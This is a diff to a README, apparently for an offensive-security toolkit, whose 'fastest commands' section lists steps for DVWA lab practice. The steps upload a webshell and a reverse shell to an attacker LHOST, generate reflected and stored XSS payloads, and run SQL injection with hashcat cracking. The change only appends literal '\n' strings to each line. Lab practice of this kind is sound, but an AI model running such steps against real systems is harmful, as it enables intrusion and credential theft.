@@ -44,23 +44,23 @@
 
 ## Fastest commands to test all modules:
 
-use rce
-set LHOST <your_kali_ip>
-run
-upload_webshell
-upload_revshell
-back
+use rce \n
+set LHOST <your_kali_ip> \n
+run \n
+upload_webshell \n
+upload_revshell \n
+back \n
 
-use xss
-setup
-generate_reflected
-paste in DVWA reflected page
+use xss \n
+setup \n
+generate_reflected \n
+paste in DVWA reflected page \n
 
-use stored_xss
-setup
-generate_stored
-paste in DVWA guestbook
+use stored_xss \n
+setup \n
+generate_stored \n
+paste in DVWA guestbook \n
 
-use sqli
-run
-check dvwa_hashes.txt + hashcat output
+use sqli \n
+run \n
+check dvwa_hashes.txt + hashcat output \n
